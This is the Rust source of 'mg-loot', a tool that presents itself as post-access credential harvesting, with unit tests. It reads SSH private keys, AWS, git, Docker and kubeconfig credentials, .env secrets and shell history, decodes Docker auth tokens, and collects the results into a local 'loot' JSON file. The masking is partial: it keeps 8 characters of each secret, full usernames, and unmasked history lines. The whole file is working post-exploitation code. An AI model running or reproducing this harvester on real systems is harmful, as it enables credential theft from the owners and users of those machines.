/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-18
 * Description:     mg-loot — post-access credential harvesting
 * Notes:           Scans common paths for credentials, tokens, and secrets.
 *                  No engagement dep; writes to a local output path only.
 *                  Secrets are masked to first 8 chars + **** in output.
 *******************************************************************/

use std::fs;
use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use base64::Engine;
use clap::Parser;
use serde::Serialize;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;

// ── Constants ────────────────────────────────────────────────────────────────

const SSH_KEY_NAMES: &[&str] = &["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"];

const SSH_KEY_BEGIN: &str = "-----BEGIN";

const HISTORY_FILES: &[&str] = &[".bash_history", ".zsh_history", ".sh_history"];

const HISTORY_PATTERNS: &[&str] = &[
    "password",
    "secret",
    "token",
    "api_key",
    " -p ",
    "--password",
    "Authorization",
];

const ENV_FILE_NAMES: &[&str] = &[".env", ".env.local", ".env.production"];

// Patterns that indicate a secret in KEY=VALUE env lines
const SECRET_KEY_PATTERNS: &[&str] = &[
    "PASSWORD",
    "SECRET",
    "TOKEN",
    "KEY",
    "CREDENTIAL",
    "AUTH",
    "PRIVATE",
];

const BROWSER_PROFILE_PATHS: &[(&str, &str)] = &[
    (".config/google-chrome", "Chrome browser profile"),
    (".mozilla/firefox", "Firefox browser profile"),
];

const MASK_KEEP_LEN: usize = 8;

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(name = "mg-loot", about = "Post-access credential harvesting")]
struct Args {
    /// Output directory for loot JSON (default: current directory)
    #[arg(long)]
    output_dir: Option<String>,

    /// Override home directory (default: $HOME)
    #[arg(long)]
    home_dir: Option<String>,

    /// Root of filesystem to scan (default: /)
    #[arg(long, default_value = "/")]
    root_dir: String,
}

// ── Output types ─────────────────────────────────────────────────────────────

#[derive(Debug, Serialize, Clone, PartialEq)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
enum Severity {
    High,
    Medium,
    Info,
}

#[derive(Debug, Serialize)]
struct Finding {
    check: String,
    severity: Severity,
    path: String,
    detail: String,
}

#[derive(Debug, Serialize)]
struct Report {
    generated_at: String,
    findings: Vec<Finding>,
}

// ── Entry point ───────────────────────────────────────────────────────────────

fn main() -> Result<()> {
    let args = Args::parse();

    let ts = OffsetDateTime::now_utc()
        .format(&Rfc3339)
        .context("format timestamp")?;

    let safe_ts = &ts[..19].replace(':', "-");
    let out_path = match &args.output_dir {
        Some(p) => format!("{}/loot-{}.json", p.trim_end_matches('/'), safe_ts),
        None => format!("./loot-{}.json", safe_ts),
    };

    let home = match &args.home_dir {
        Some(h) => PathBuf::from(h),
        None => {
            let h = std::env::var("HOME").context("$HOME not set — use --home-dir")?;
            PathBuf::from(h)
        }
    };

    let mut findings: Vec<Finding> = Vec::new();

    // Scan SSH private keys under ~/.ssh/
    findings.extend(scan_ssh_keys(&home));

    // Scan AWS credentials and config
    findings.extend(scan_aws_credentials(&home));

    // Scan git credentials and config
    findings.extend(scan_git_credentials(&home));

    // Scan Docker config for registry auth tokens
    findings.extend(scan_docker_config(&home));

    // Scan shell history files for secret-containing lines
    findings.extend(scan_shell_history(&home));

    // Scan .env files up to 3 levels deep from current dir
    findings.extend(scan_env_files(Path::new(".")));

    // Note browser profile paths if they exist
    findings.extend(scan_browser_profiles(&home));

    // Scan kubectl config for tokens and cluster URLs
    findings.extend(scan_kubectl_config(&home));

    // Print all findings to stdout
    for f in &findings {
        let sev = match f.severity {
            Severity::High => "HIGH",
            Severity::Medium => "MED ",
            Severity::Info => "INFO",
        };
        println!("[{}] {} — {} — {}", sev, f.check, f.path, f.detail);
    }

    println!("\n{} finding(s)", findings.len());

    // Write JSON report
    let report = Report {
        generated_at: ts,
        findings,
    };
    let json = serde_json::to_string_pretty(&report).context("serialize report")?;
    fs::write(&out_path, &json).with_context(|| format!("write {out_path}"))?;
    println!("Written: {out_path}");

    let _ = args.root_dir; // reserved for future filesystem walk expansion

    Ok(())
}

// ── Scanners ──────────────────────────────────────────────────────────────────

// Scan ~/.ssh/ for readable private key files
fn scan_ssh_keys(home: &Path) -> Vec<Finding> {
    let ssh_dir = home.join(".ssh");
    let mut findings = Vec::new();

    if !ssh_dir.exists() {
        return findings;
    }

    let Ok(entries) = fs::read_dir(&ssh_dir) else {
        return findings;
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");

        let is_key_name =
            SSH_KEY_NAMES.contains(&name) || name.ends_with(".pem") || name.ends_with(".key");

        if !is_key_name {
            continue;
        }

        // Read first 2 lines to confirm PEM header
        let content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        if content.trim_start().starts_with(SSH_KEY_BEGIN) {
            findings.push(Finding {
                check: "SSH_PRIVATE_KEY".into(),
                severity: Severity::High,
                path: path.display().to_string(),
                detail: "readable private key file".into(),
            });
        }
    }

    findings
}

// Scan ~/.aws/credentials and ~/.aws/config for keys
fn scan_aws_credentials(home: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let aws_dir = home.join(".aws");

    for filename in &["credentials", "config"] {
        let path = aws_dir.join(filename);
        let content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(_) => continue,
        };
        let extracted = extract_aws_values(&content);
        for (key, value) in extracted {
            findings.push(Finding {
                check: "AWS_CREDENTIAL".into(),
                severity: Severity::High,
                path: path.display().to_string(),
                detail: format!("{key} = {}", mask_secret(&value)),
            });
        }
    }

    findings
}

// Extract AWS key names and their values from credentials file content
fn extract_aws_values(content: &str) -> Vec<(String, String)> {
    let patterns = [
        "aws_access_key_id",
        "aws_secret_access_key",
        "aws_session_token",
    ];
    let mut results = Vec::new();

    for line in content.lines() {
        let trimmed = line.trim();
        for pat in &patterns {
            if trimmed.to_lowercase().starts_with(pat)
                && let Some((_, val)) = trimmed.split_once('=')
            {
                let val = val.trim().to_string();
                if !val.is_empty() {
                    results.push((pat.to_string(), val));
                }
            }
        }
    }

    results
}

// Scan ~/.git-credentials and ~/.gitconfig for embedded passwords
fn scan_git_credentials(home: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Check .git-credentials for https://user:pass@host entries
    let git_creds_path = home.join(".git-credentials");
    if let Ok(content) = fs::read_to_string(&git_creds_path) {
        for line in content.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }
            if let Some(creds) = extract_url_credentials(trimmed) {
                findings.push(Finding {
                    check: "GIT_CREDENTIAL".into(),
                    severity: Severity::High,
                    path: git_creds_path.display().to_string(),
                    detail: creds,
                });
            }
        }
    }

    // Check .gitconfig for credential helper or insteadOf URL substitutions
    let gitconfig_path = home.join(".gitconfig");
    if let Ok(content) = fs::read_to_string(&gitconfig_path) {
        for line in content.lines() {
            let trimmed = line.trim();
            if trimmed.contains("://")
                && let Some(creds) = extract_url_credentials(trimmed)
            {
                findings.push(Finding {
                    check: "GIT_CREDENTIAL".into(),
                    severity: Severity::High,
                    path: gitconfig_path.display().to_string(),
                    detail: creds,
                });
            }
        }
    }

    findings
}

// Extract user:pass from a URL that embeds credentials
fn extract_url_credentials(url: &str) -> Option<String> {
    // Pattern: scheme://user:pass@host
    let after_scheme = url.split("://").nth(1)?;
    let at_pos = after_scheme.find('@')?;
    let userinfo = &after_scheme[..at_pos];
    let colon_pos = userinfo.find(':')?;
    let user = &userinfo[..colon_pos];
    let pass = &userinfo[colon_pos + 1..];
    if pass.is_empty() {
        return None;
    }
    Some(format!("user={user} pass={}", mask_secret(pass)))
}

// Scan ~/.docker/config.json for registry auth tokens
fn scan_docker_config(home: &Path) -> Vec<Finding> {
    let config_path = home.join(".docker").join("config.json");
    let content = match fs::read_to_string(&config_path) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };

    let decoded = decode_docker_auth(&content);
    decoded
        .into_iter()
        .map(|(registry, detail)| Finding {
            check: "DOCKER_AUTH_TOKEN".into(),
            severity: Severity::High,
            path: config_path.display().to_string(),
            detail: format!("registry={registry} {detail}"),
        })
        .collect()
}

// Parse docker config JSON and base64-decode auth tokens
fn decode_docker_auth(content: &str) -> Vec<(String, String)> {
    let Ok(val): Result<serde_json::Value, _> = serde_json::from_str(content) else {
        return Vec::new();
    };

    let Some(auths) = val.get("auths").and_then(|a| a.as_object()) else {
        return Vec::new();
    };

    let mut results = Vec::new();

    for (registry, auth_obj) in auths {
        if let Some(auth_b64) = auth_obj.get("auth").and_then(|a| a.as_str())
            && let Ok(decoded_bytes) = base64::engine::general_purpose::STANDARD.decode(auth_b64)
        {
            let decoded = String::from_utf8_lossy(&decoded_bytes);
            if let Some(colon) = decoded.find(':') {
                let user = &decoded[..colon];
                let pass = &decoded[colon + 1..];
                results.push((
                    registry.clone(),
                    format!("user={user} pass={}", mask_secret(pass)),
                ));
            } else {
                results.push((registry.clone(), format!("auth={}", mask_secret(&decoded))));
            }
        }
    }

    results
}

// Scan shell history files for lines containing secret patterns
fn scan_shell_history(home: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    for filename in HISTORY_FILES {
        let path = home.join(filename);
        let content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        for line in content.lines() {
            if HISTORY_PATTERNS
                .iter()
                .any(|pat| line.to_lowercase().contains(&pat.to_lowercase()))
            {
                findings.push(Finding {
                    check: "HISTORY_SECRET".into(),
                    severity: Severity::Medium,
                    path: path.display().to_string(),
                    detail: truncate_line(line, 120),
                });
            }
        }
    }

    findings
}

// Scan .env files up to max_depth directory levels from root
fn scan_env_files(root: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    scan_env_dir(root, 0, 3, &mut findings);
    findings
}

// Recursively scan directories for .env files up to max_depth
fn scan_env_dir(dir: &Path, depth: usize, max_depth: usize, findings: &mut Vec<Finding>) {
    if depth > max_depth {
        return;
    }

    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() && depth < max_depth {
            scan_env_dir(&path, depth + 1, max_depth, findings);
        } else if path.is_file() {
            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if ENV_FILE_NAMES.contains(&name)
                && let Ok(content) = fs::read_to_string(&path)
            {
                for detail in parse_env_secrets(&content) {
                    findings.push(Finding {
                        check: "ENV_SECRET".into(),
                        severity: Severity::High,
                        path: path.display().to_string(),
                        detail,
                    });
                }
            }
        }
    }
}

// Parse .env file content for KEY=VALUE lines matching secret patterns
fn parse_env_secrets(content: &str) -> Vec<String> {
    let mut results = Vec::new();

    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let Some((key, value)) = trimmed.split_once('=') else {
            continue;
        };
        let key_upper = key.trim().to_uppercase();
        if SECRET_KEY_PATTERNS
            .iter()
            .any(|pat| key_upper.contains(pat))
            && !value.trim().is_empty()
        {
            results.push(format!("{}={}", key.trim(), mask_secret(value.trim())));
        }
    }

    results
}

// Check for browser profile directories and flag their presence
fn scan_browser_profiles(home: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (rel_path, label) in BROWSER_PROFILE_PATHS {
        let full_path = home.join(rel_path);
        if full_path.exists() {
            findings.push(Finding {
                check: "BROWSER_PROFILE".into(),
                severity: Severity::Info,
                path: full_path.display().to_string(),
                detail: format!("{label} — may contain saved passwords"),
            });
        }
    }

    findings
}

// Scan ~/.kube/config for cluster server URLs and user tokens
fn scan_kubectl_config(home: &Path) -> Vec<Finding> {
    let config_path = home.join(".kube").join("config");
    let content = match fs::read_to_string(&config_path) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };

    parse_kubectl_config(&content, &config_path.display().to_string())
}

// Parse kubectl config YAML for server URLs and token/cert entries
fn parse_kubectl_config(content: &str, path: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("server:") {
            let server = trimmed.trim_start_matches("server:").trim();
            if !server.is_empty() {
                findings.push(Finding {
                    check: "KUBECTL_SERVER".into(),
                    severity: Severity::Info,
                    path: path.to_string(),
                    detail: format!("cluster server: {server}"),
                });
            }
        } else if trimmed.starts_with("token:") {
            let token = trimmed.trim_start_matches("token:").trim();
            if !token.is_empty() {
                findings.push(Finding {
                    check: "KUBECTL_TOKEN".into(),
                    severity: Severity::High,
                    path: path.to_string(),
                    detail: format!("user token: {}", mask_secret(token)),
                });
            }
        } else if trimmed.starts_with("client-certificate-data:")
            || trimmed.starts_with("client-key-data:")
        {
            findings.push(Finding {
                check: "KUBECTL_CLIENT_CERT".into(),
                severity: Severity::High,
                path: path.to_string(),
                detail: format!(
                    "embedded client cert/key data: {}",
                    trimmed.split(':').next().unwrap_or("")
                ),
            });
        }
    }

    findings
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Mask a secret value: keep first MASK_KEEP_LEN chars, replace rest with ****
fn mask_secret(value: &str) -> String {
    if value.len() <= MASK_KEEP_LEN {
        return "****".to_string();
    }
    format!("{}****", &value[..MASK_KEEP_LEN])
}

// Truncate a line to max_len characters
fn truncate_line(line: &str, max_len: usize) -> String {
    if line.len() <= max_len {
        line.to_string()
    } else {
        format!("{}...", &line[..max_len])
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mask_short_secret_fully_masked() {
        assert_eq!(mask_secret("abc"), "****");
    }

    #[test]
    fn mask_long_secret_keeps_prefix() {
        let masked = mask_secret("AKIAIOSFODNN7EXAMPLE");
        assert!(masked.starts_with("AKIAIOSF"));
        assert!(masked.ends_with("****"));
    }

    #[test]
    fn extract_aws_values_finds_keys() {
        let content = "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG\n";
        let vals = extract_aws_values(content);
        assert_eq!(vals.len(), 2);
        assert_eq!(vals[0].0, "aws_access_key_id");
        assert_eq!(vals[0].1, "AKIAIOSFODNN7EXAMPLE");
    }

    #[test]
    fn extract_url_credentials_finds_user_pass() {
        let url = "https://jeff:supersecret@github.com";
        let result = extract_url_credentials(url).unwrap();
        assert!(result.contains("user=jeff"));
        assert!(result.contains("supersec****"));
    }

    #[test]
    fn extract_url_credentials_no_pass_returns_none() {
        let url = "https://github.com/repo";
        assert!(extract_url_credentials(url).is_none());
    }

    #[test]
    fn decode_docker_auth_extracts_creds() {
        // base64("jeff:mytoken") = "amVmZjpteXRva2Vu"
        let config = r#"{"auths":{"registry.example.com":{"auth":"amVmZjpteXRva2Vu"}}}"#;
        let results = decode_docker_auth(config);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].0, "registry.example.com");
        assert!(results[0].1.contains("user=jeff"));
    }

    #[test]
    fn parse_env_secrets_finds_password_key() {
        let content = "DB_HOST=localhost\nDB_PASSWORD=supersecret\nAPI_KEY=abc123def456\n";
        let results = parse_env_secrets(content);
        assert_eq!(results.len(), 2);
        assert!(results[0].contains("DB_PASSWORD"));
        assert!(results[1].contains("API_KEY"));
    }

    #[test]
    fn parse_env_secrets_skips_empty_values() {
        let content = "SECRET_KEY=\nDB_NAME=mydb\n";
        let results = parse_env_secrets(content);
        assert!(results.is_empty());
    }

    #[test]
    fn parse_env_secrets_skips_comments() {
        let content = "# SECRET_KEY=should_not_appear\nNAME=value\n";
        let results = parse_env_secrets(content);
        assert!(results.is_empty());
    }

    #[test]
    fn parse_kubectl_config_finds_server_and_token() {
        let content = "clusters:\n- cluster:\n    server: https://k8s.example.com:6443\n  name: prod\nusers:\n- user:\n    token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9abc\n";
        let findings = parse_kubectl_config(content, "/home/jeff/.kube/config");
        let server = findings.iter().find(|f| f.check == "KUBECTL_SERVER");
        let token = findings.iter().find(|f| f.check == "KUBECTL_TOKEN");
        assert!(server.is_some(), "expected server finding");
        assert!(token.is_some(), "expected token finding");
    }

    #[test]
    fn truncate_line_short_unchanged() {
        let line = "short line";
        assert_eq!(truncate_line(line, 120), "short line");
    }

    #[test]
    fn truncate_line_long_truncated() {
        let line = "a".repeat(150);
        let result = truncate_line(&line, 120);
        assert!(result.ends_with("..."));
        assert!(result.len() < 130);
    }
}
